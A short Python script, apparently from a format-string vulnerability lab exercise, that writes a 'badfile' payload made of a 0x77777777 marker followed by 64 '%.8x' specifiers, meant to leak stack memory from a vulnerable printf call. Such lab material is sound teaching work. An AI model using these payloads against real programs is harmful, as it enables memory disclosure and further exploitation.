#!/usr/bin/python3
import sys

# Initialize the content array
N = 1500
content = bytearray(0x0 for i in range(N))

number  = 0x77777777
content[0:4]  =  (number).to_bytes(4,byteorder='little')

s = "%.8x "*64

fmt  = (s).encode('latin-1')
content[4:4+len(fmt)] = fmt

# Write the content to badfile
with open('badfile', 'wb') as f:
    f.write(content)

